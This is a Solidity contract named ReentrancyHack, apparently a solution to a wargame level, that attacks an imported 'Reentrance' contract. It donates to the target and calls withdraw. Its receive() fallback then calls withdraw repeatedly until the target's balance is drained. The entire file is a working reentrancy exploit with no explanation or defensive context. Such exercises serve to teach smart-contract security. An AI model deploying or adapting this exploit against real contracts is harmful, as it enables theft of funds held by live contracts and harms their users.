// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./Reentrance.sol";

contract ReentrancyHack {

    Reentrance target;
    uint balanceAtTarget;

    constructor(address payable _target) public payable {
        target = Reentrance(_target);
    }

    function attack(uint _amount) public {

        balanceAtTarget = _amount;

        target.donate{ value: _amount }(address(this));

        target.withdraw(_amount);
    }

    receive() external payable {

        uint targetBalance = address(target).balance;

        if (targetBalance != 0) {
            
            uint amount = targetBalance <= balanceAtTarget ? targetBalance : balanceAtTarget;

            target.withdraw(amount);
        }
    }

}